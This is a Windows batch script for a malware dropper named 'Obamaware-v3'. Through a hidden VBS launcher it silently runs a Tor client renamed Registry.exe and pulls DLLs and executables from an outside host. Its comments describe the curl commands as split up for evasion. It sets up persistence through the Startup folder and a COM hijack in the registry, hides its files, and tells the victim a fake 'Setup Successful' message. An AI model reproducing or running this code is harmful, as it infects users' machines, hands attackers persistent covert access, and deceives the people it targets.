@echo off
setlocal
setlocal enabledelayedexpansion

:: ===============================
:: STEALTH CONFIG (KEEP NAMES)
:: ===============================

set "TOR_DIR=%LOCALAPPDATA%\Obamaware-v3\tor"
set "TOR_DATA=%TOR_DIR%\data"
set "TOR_DATA_UNIX=%TOR_DATA:\=/%"
set "TOR_ARCHIVE=%LOCALAPPDATA%\Obamaware-v3\tor-win32.tar.gz"
set "VENV=%LOCALAPPDATA%\Obamaware-v3"
set "INSC_BAT=%TEMP%\s%RANDOM:~0,4%%RANDOM:~0,4%.bat"
set "INSC_VBS=%TEMP%\v%RANDOM:~0,4%%RANDOM:~0,4%.vbs"

del "%INSC_BAT%" 2>nul
del "%INSC_VBS%" 2>nul

:: ===============================
:: GENERATE INSTALLER (FRAGMENTED CURL)
:: ===============================

echo @echo off > "%INSC_BAT%"
echo setlocal >> "%INSC_BAT%"
echo setlocal enabledelayedexpansion >> "%INSC_BAT%"
echo. >> "%INSC_BAT%"
echo set "TOR_DIR=%TOR_DIR%" >> "%INSC_BAT%"
echo set "TOR_DATA=%TOR_DATA%" >> "%INSC_BAT%"
echo set "TOR_DATA_UNIX=%TOR_DATA_UNIX%" >> "%INSC_BAT%"
echo set "TOR_ARCHIVE=%TOR_ARCHIVE%" >> "%INSC_BAT%"
echo set "VENV=%VENV%" >> "%INSC_BAT%"
echo. >> "%INSC_BAT%"

:: Folders + Tor setup (unchanged)
echo mkdir "%%TOR_DIR%%" 2^>nul >> "%INSC_BAT%"
echo mkdir "%%TOR_DATA%%" 2^>nul >> "%INSC_BAT%"
echo mkdir "%%VENV%%" 2^>nul >> "%INSC_BAT%"
echo curl -L -o "%%TOR_ARCHIVE%%" https://archive.torproject.org/tor-package-archive/torbrowser/14.5.8/tor-expert-bundle-windows-x86_64-14.5.8.tar.gz -s >> "%INSC_BAT%"
echo tar -xf "%%TOR_ARCHIVE%%" -C "%%TOR_DIR%%" ^>nul ^|^| powershell -Command "tar -xf '%%TOR_ARCHIVE%%' -C '%%TOR_DIR%%'" >> "%INSC_BAT%"
echo del "%%TOR_ARCHIVE%%" ^>nul 2^>^&1 >> "%INSC_BAT%"
echo. >> "%INSC_BAT%"

:: Randomized Tor binary name only
set /a "TOR_RAND=R%RANDOM% %% 9000 + 1000"
echo echo SocksPort 9050 ^> "%%TOR_DIR%%\tor\torrc" >> "%INSC_BAT%"
echo echo ControlPort 0 ^>^> "%%TOR_DIR%%\tor\torrc" >> "%INSC_BAT%"
echo echo DataDirectory %TOR_DATA_UNIX%/ ^>^> "%%TOR_DIR%%\tor\torrc" >> "%INSC_BAT%"
echo echo Log notice file NUL ^>^> "%%TOR_DIR%%\tor\torrc" >> "%INSC_BAT%"
echo ren "%%TOR_DIR%%\tor\tor.exe" "Registry.exe" >> "%INSC_BAT%"
echo start "" /B "%%TOR_DIR%%\tor\Registry.exe" >> "%INSC_BAT%"
echo timeout /t 10 /nobreak ^>nul >> "%INSC_BAT%"

:: FRAGMENTED CURL DOWNLOADS (KEY EVASION)
echo set "C1=curl https://files.webclaw.qzz.io/mapper_args.dll" >> "%INSC_BAT%"
echo set "C2=-L -o %%VENV%%\dependencymanager.dll" >> "%INSC_BAT%"
echo %%C1%% %%C2%% >> "%INSC_BAT%"

echo set "C3=curl https://files.webclaw.qzz.io/directmanipulation_proxy.dll" >> "%INSC_BAT%"
echo set "C4=-L -o %%VENV%%\directmanipulation.dll" >> "%INSC_BAT%"
echo %%C3%% %%C4%% >> "%INSC_BAT%"

echo set "C5=curl https://files.webclaw.qzz.io/load_mapper.exe" >> "%INSC_BAT%"
echo set "C6=-L -o %%VENV%%\winexpress.exe" >> "%INSC_BAT%"
echo %%C5%% %%C6%% >> "%INSC_BAT%"

echo set "C7=curl https://files.webclaw.qzz.io/win_start.cmd" >> "%INSC_BAT%"
echo set "C8=-L -o %%VENV%%\win_start.cmd" >> "%INSC_BAT%"
echo %%C7%% %%C8%% >> "%INSC_BAT%"

echo set "C9=curl https://files.webclaw.qzz.io/elevate.cmd" >> "%INSC_BAT%"
echo set "C10=-L -o %%VENV%%\elevate.cmd" >> "%INSC_BAT%"
echo %%C9%% %%C10%% >> "%INSC_BAT%"

echo set "C11=curl https://files.webclaw.qzz.io/obamaware.tar.gz" >> "%INSC_BAT%"
echo set "C12=%%VENV%%\Windows Wireless LAN adapter.tar.gz" >> "%INSC_BAT%"
echo %%C11%% -L -o "%%C12%%" >> "%INSC_BAT%"
echo tar -xf "%%C12%%" -C "%%VENV%%" >> "%INSC_BAT%"
echo move /Y "%%VENV%%\obamaware.exe" "%%APPDATA%%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Wireless LAN adapter.exe" >> "%INSC_BAT%"
echo del "%%VENV%%\Windows Wireless LAN adapter.tar.gz" >> "%INSC_BAT%"

echo set "C13=curl https://files.webclaw.qzz.io/elevateable.exe" >> "%INSC_BAT%"
echo set "C14=-L -o %%VENV%%\e.exe" >> "%INSC_BAT%"
echo %%C13%% %%C14%% >> "%INSC_BAT%"

echo set "C15=curl https://files.webclaw.qzz.io/start_elevateable.exe" >> "%INSC_BAT%"
echo set "C16=-L -o %%VENV%%\start_elevateable.exe" >> "%INSC_BAT%"
echo %%C15%% %%C16%% >> "%INSC_BAT%"

echo ren "%%VENV%%\e.exe" "Windows Wireless LAN Adapter.exe" >> "%INSC_BAT%"

:: STAGED REGISTRY (separate short commands)
echo powershell -c "ni -ea 0 'HKCU:\Software\Classes\CLSID\{54E211B6-3650-4F75-8334-FA359598E1C5}\InprocServer32' -Force" >> "%INSC_BAT%"
echo powershell -c "sp 'HKCU:\Software\Classes\CLSID\{54E211B6-3650-4F75-8334-FA359598E1C5}\InprocServer32' '(default)' -Value \"$env:LOCALAPPDATA\Obamaware-v3\directmanipulation.dll\"" >> "%INSC_BAT%"


echo timeout /t 5 /nobreak ^>nul >> "%INSC_BAT%"
echo attrib +h +s "%%VENV%%" >> "%INSC_BAT%"
echo attrib +h +s "%%TOR_DIR%%" >> "%INSC_BAT%"
echo attrib +h +s "%%VENV%%\dependencymanager.dll" >> "%INSC_BAT%"
echo attrib +h +s "%%VENV%%\directmanipulation.dll" >> "%INSC_BAT%"
echo attrib +h +s "%%VENV%%\winexpress.exe" >> "%INSC_BAT%"
echo attrib +h +s "%%VENV%%\win_start.cmd" >> "%INSC_BAT%"
echo attrib +h +s "%%VENV%%\elevate.cmd" >> "%INSC_BAT%"
echo attrib +h +s "%%VENV%%\Windows Wireless LAN Adapter.exe" >> "%INSC_BAT%"
echo attrib +h +s "%%VENV%%\start_elevateable.exe" >> "%INSC_BAT%"
echo endlocal >> "%INSC_BAT%"

:: VBS launcher (randomized temp names)
echo Set WshShell = CreateObject^("WScript.Shell"^) > "%INSC_VBS%"
echo WshShell.Run "%INSC_BAT%", 0 >> "%INSC_VBS%"
echo Set WshShell = Nothing >> "%INSC_VBS%"

wscript "%INSC_VBS%"
echo [+] Setup Successful. Please continue with the authenticaton process.
timeout /t 3 /nobreak >nul
endlocal